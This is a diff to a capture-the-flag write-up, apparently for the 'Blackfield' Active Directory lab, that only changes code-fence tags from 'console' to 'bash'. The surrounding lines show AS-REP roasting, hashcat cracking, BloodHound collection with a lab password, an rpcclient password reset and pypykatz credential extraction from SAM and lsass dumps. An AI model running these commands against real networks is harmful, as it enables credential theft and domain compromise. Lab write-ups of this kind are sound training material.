@@ -46,7 +46,7 @@ Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 We can get usernames via profles$ share and use it with ASREP Roasting.
 
-``` console
+``` bash
 mask ""
 recurse ON
 prompt OFF
@@ -57,7 +57,7 @@ mget *
 
 ## ASREP Roasting
 
-```console
+```bash
 impacket-GetNPUsers BLACKFIELD.local/ -usersfile user.txt -format hashcat -outputfile hashes.asreproast
 
 hashcat -m 18200 --force -a 0 hashes.asreproast /user/share/worldists/rockyou.txt
@@ -73,7 +73,7 @@ As mentioned above we still can't access the content of the forensic share.
 
 ## BloodHound
 
-```console
+```bash
 bloodhound-python -c all -u "support" -p "#00^BlackKnight" -d blackfield.local -dc dc01.blackfield.local -ns 10.129.229.17 --zip
 ```
 
@@ -87,7 +87,7 @@ bloodhound-python -c all -u "support" -p "#00^BlackKnight" -d blackfield.local -
 
 As mentioned at [here](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword) rpcclient gets the job done easier.
 
-```console
+```bash
 rpcclient -U blackfield.local/support dc01.blackfield.local
 ```
 
@@ -95,7 +95,7 @@ rpcclient -U blackfield.local/support dc01.blackfield.local
 
 ## Access Foresic share
 
-```console
+```bash
 nxc smb blackfield.local -u audit2020 -p 'Test!!!!' --shares
 ```
 
@@ -109,7 +109,7 @@ we can extract lsass.DMP from memory_analysis/lsass.zip
 
 ## lsass dump
 
-```console
+```bash
 pypykatz registry --sam sam system
 ```
 
